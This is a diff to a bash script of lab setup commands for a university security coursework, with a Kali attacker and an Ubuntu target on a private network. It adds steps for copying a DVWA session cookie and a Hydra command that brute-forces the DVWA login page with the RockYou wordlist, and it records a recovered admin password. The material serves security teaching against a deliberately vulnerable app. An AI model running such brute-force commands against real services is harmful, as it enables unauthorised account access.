@@ -1,7 +1,6 @@
 #!/bin/bash
 # ============================================================
 # ELEC0138 CW1 — Lab Setup Commands
-# Student: 22009130
 # Environment: VirtualBox on macOS (Apple Silicon M2)
 # Attacker: Kali Linux 2026.1 ARM64  (10.0.0.1)
 # Target:   Ubuntu Server 24.04 ARM64 (10.0.0.2)
@@ -100,7 +99,14 @@ python3 sql_injection_demo.py
 # 3.4 Unzip RockYou wordlist (if not already done)
 sudo gunzip /usr/share/wordlists/rockyou.txt.gz
 
-# 3.5 Hydra brute force (save output)
+# 3.5 Get a valid DVWA session cookie (required to access the brute force vulnerability page)
+# Log into DVWA and retrieve the PHPSESSID from the browser:
+# Open Firefox on Kali → http://10.0.0.2/dvwa/login.php → login as admin/password
+# Open Inspector (F12) → Storage → Cookies → copy PHPSESSID value
+# Set security level to Low: DVWA Security tab → Low → Submit
+
+# 3.6 Hydra brute force against DVWA Brute Force vulnerability page (save output)
+# Replace PHPSESSID value below with the one copied from your browser session
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.0.2 \
-  http-get-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" \
-  -V 2>&1 | tee hydra_output.txt
+  http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=<YOUR_PHPSESSID>;security=low:F=Username and/or password incorrect."
+# Result: 1 valid password found — admin:password
